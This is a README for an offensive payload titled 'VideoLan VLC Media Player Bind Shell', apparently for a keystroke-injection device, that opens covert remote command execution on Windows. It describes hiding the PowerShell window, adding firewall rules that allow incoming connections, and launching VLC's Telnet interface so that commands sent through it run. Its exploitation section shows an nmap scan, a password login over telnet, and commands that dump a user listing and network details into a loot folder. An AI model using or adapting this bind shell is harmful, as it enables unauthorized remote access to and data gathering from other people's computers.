# "VideoLan VLC Media Player" Bind Shell

- Title:         "VideoLan VLC Media Player" Bind Shell
- Author:        TW-D
- Version:       1.0
- Target:        Microsoft Windows
- Category:      Remote Access

## Concept

In the list of commands allowed by "VideoLan VLC Media Player" on the "Telnet" interface, the use of the command "add" with a wrong argument redirects to the "stderr" of the process the exact content of this argument. The PowerShell script listens to the "stderr" output of the "VideoLan VLC Media Player" process and retrieves the payload to execute it.

## Description

1) Hide "PowerShell" window.
2) Determines the path of the "VLC Media Player" executable.
3) Creates two rules on the native firewall of "Microsoft Windows" to :
- Allow the executable to open a TCP port.
- Allow all incoming connections on that TCP port.
4) Starts the "VLC Media Player" executable with the "Telnet" interface enabled.
5) Redirects the standard error output of this process and retrieves the payload for execution.

## Configuration

From "payload.txt" change the values of the following constants :
```bash

######## INITIALIZATION ########

readonly TELNET_PORT="44423"
readonly TELNET_PASSWORD="VLC_T3LN3T"

```

## Exploitation

```
hacker@hacker-computer:~$ nmap -Pn -sT -p 44423 <TARGET-IP>
[...]
hacker@hacker-computer:~$ telnet <TARGET-IP> 44423
Trying <TARGET-IP>...
Connected to <TARGET-IP>.
Escape character is '^]'.
VLC media player 3.0.18 Vetinari
Password: <TELNET_PASSWORD>
Welcome, Master
> add "EXEC/(ls C:\Users\) > .\..\..\loot\ls.log"
> add "EXEC/(ipconfig) > .\..\..\loot\ipconfig.log"
> shutdown
```
